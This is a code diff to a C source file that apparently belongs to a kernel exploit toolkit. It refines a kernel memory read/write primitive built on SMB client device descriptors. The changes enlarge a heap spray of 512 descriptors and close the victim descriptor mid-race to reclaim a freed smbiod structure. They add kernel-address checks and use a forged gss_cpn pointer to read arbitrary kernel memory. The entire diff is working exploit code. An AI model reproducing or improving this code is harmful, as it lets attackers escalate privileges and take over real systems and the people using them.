@@ -16,9 +16,12 @@
 #include "smbiod_rw.h"
 #include "util_assert.h"
 #include "util_dispatch.h"
+#include "util_log.h"
+#include "util_binary.h"
+#include "platform_constants.h"
 
 
-#define KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT 356
+#define KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT 512
 
 
 struct kmem_smbiod_rw {
@@ -48,9 +51,9 @@ void kmem_smbiod_rw_read_iod(kmem_smbiod_rw_t rw, struct smbiod* out) {
     error = smb_client_ioc_auth_info(rw->fd_rw, (char*)&iod1, sizeof(iod1), (char*)&iod2, sizeof(iod2), NULL);
     xe_assert_err(error);
     
-    if (iod1.iod_gss.gss_target_nt == gss_target_nt) {
+    if (iod1.iod_gss.gss_target_nt == gss_target_nt && XE_VM_KERNEL_ADDRESS_VALID((uintptr_t)iod1.iod_tdesc)) {
         *out = iod1;
-    } else if (iod2.iod_gss.gss_target_nt == gss_target_nt) {
+    } else if (iod2.iod_gss.gss_target_nt == gss_target_nt && XE_VM_KERNEL_ADDRESS_VALID((uintptr_t)iod2.iod_tdesc)) {
         *out = iod2;
     } else {
         printf("[ERROR] read failed, gss_target_nt does not match\n");
@@ -60,6 +63,8 @@ void kmem_smbiod_rw_read_iod(kmem_smbiod_rw_t rw, struct smbiod* out) {
 
 
 void kmem_smbiod_rw_write_iod(kmem_smbiod_rw_t rw, const struct smbiod* value) {
+    xe_log_debug("smbiod_rw write start");
+    
     int* fds_capture = alloca(sizeof(int) * KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT);
     dispatch_apply(KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT, DISPATCH_APPLY_AUTO, ^(size_t index) {
         fds_capture[index] = smb_client_open_dev();
@@ -69,19 +74,29 @@ void kmem_smbiod_rw_write_iod(kmem_smbiod_rw_t rw, const struct smbiod* value) {
     });
     
     uint32_t gss_target_nt_base = rand();
-    close(rw->fd_rw);
     dispatch_apply(KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT, DISPATCH_APPLY_AUTO, ^(size_t index) {
-        struct smbiod iod = *value;
-        iod.iod_gss.gss_target_nt = gss_target_nt_base + (int)index;
-        int error = smb_client_ioc_ssn_setup(fds_capture[index], (char*)&iod, sizeof(iod), (char*)&iod, sizeof(iod));
+        if (index == 32) { close(rw->fd_rw); }
+        struct smbiod iod1 = *value;
+        iod1.iod_gss.gss_target_nt = gss_target_nt_base + (int)index * 2;
+        struct smbiod iod2 = *value;
+        iod2.iod_gss.gss_target_nt = iod1.iod_gss.gss_target_nt + 1;
+        int error = smb_client_ioc_ssn_setup(fds_capture[index], (char*)&iod1, sizeof(iod1), (char*)&iod2, sizeof(iod2));
         xe_assert_err(error);
     });
-        
+    
     uint32_t new_gss_target_nt;
     int error = smb_client_ioc_auth_info(rw->fd_iod, NULL, UINT32_MAX, NULL, UINT32_MAX, &new_gss_target_nt);
     xe_assert_err(error);
-    int captured_idx = new_gss_target_nt - gss_target_nt_base;
-    xe_assert(captured_idx >= 0 && captured_idx < KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT);
+    
+    if ((new_gss_target_nt - gss_target_nt_base) % 2 == 0) {
+        xe_log_debug("captured by gss_cpn");
+    } else {
+        xe_log_debug("captured by gss_spn");
+    }
+    
+    int captured_idx = (new_gss_target_nt - gss_target_nt_base) / 2;
+    xe_assert_cond(captured_idx, >=, 0)
+    xe_assert_cond(captured_idx, <, KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT);
     rw->fd_rw = fds_capture[captured_idx];
     
     dispatch_apply(KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT, DISPATCH_APPLY_AUTO, ^(size_t index) {
@@ -89,6 +104,8 @@ void kmem_smbiod_rw_write_iod(kmem_smbiod_rw_t rw, const struct smbiod* value) {
             close(fds_capture[index]);
         }
     });
+    
+    xe_log_debug("smbiod_rw write complete");
 }
 
 
@@ -96,6 +113,7 @@ void kmem_smbiod_rw_read_data(kmem_smbiod_rw_t rw, void* dst, uintptr_t src, siz
     xe_assert(size <= UINT32_MAX);
     struct smbiod iod;
     kmem_smbiod_rw_read_iod(rw, &iod);
+    xe_assert_kaddr((uintptr_t)iod.iod_tdesc);
     iod.iod_gss.gss_cpn = (uint8_t*)src;
     iod.iod_gss.gss_cpn_len = (uint32_t)size;
     kmem_smbiod_rw_write_iod(rw, &iod);
